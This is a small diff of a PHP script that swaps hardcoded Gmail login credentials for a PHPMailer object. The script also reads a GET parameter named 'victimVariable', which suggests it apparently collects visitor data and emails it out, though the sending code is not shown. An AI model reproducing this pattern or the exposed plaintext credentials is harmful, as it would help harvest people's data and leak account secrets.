@@ -8,7 +8,7 @@ header('Access-Control-Allow-Headers:Access-Control-Allow-Headers,Origin,Accept,
    
    require 'D:\composer\vendor\autoload.php';
    
-   $account = array("fearmypowergoodsir2@gmail.com", "sp4m.m3!2");
+   $account = array("fearmypowergoodsiralt@gmail.com", "sp4m.m3!alt");
    $mail = new PHPMailer(true);
    
    $victimVariable = $_GET['victimVariable'];
